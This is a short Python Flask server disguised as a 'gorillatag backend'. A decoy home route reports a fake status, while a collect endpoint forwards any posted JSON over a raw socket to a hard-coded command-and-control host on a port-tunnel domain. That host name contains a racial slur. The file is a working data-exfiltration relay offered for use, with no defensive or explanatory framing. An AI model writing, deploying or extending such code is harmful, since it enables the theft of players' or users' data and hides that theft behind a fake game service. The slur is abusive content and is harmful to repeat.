from flask import Flask, request, jsonify
import socket
import json

app = Flask(__name__)

C2_HOST = "niggerbigertrigger-40627.portmap.host"
C2_PORT = 40627

@app.route('/')
def fake_home():
    return jsonify({"status": "gorillatag backend online", "version": "1.2.3"}), 200

@app.route('/gorillatagbackend/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json(force=True)
        if not data:
            return jsonify({"status": "invalid"}), 400

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall((json.dumps(data) + "\n").encode('utf-8'))
        s.close()

        return jsonify({"status": "success"}), 200
    except:
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    app.run()
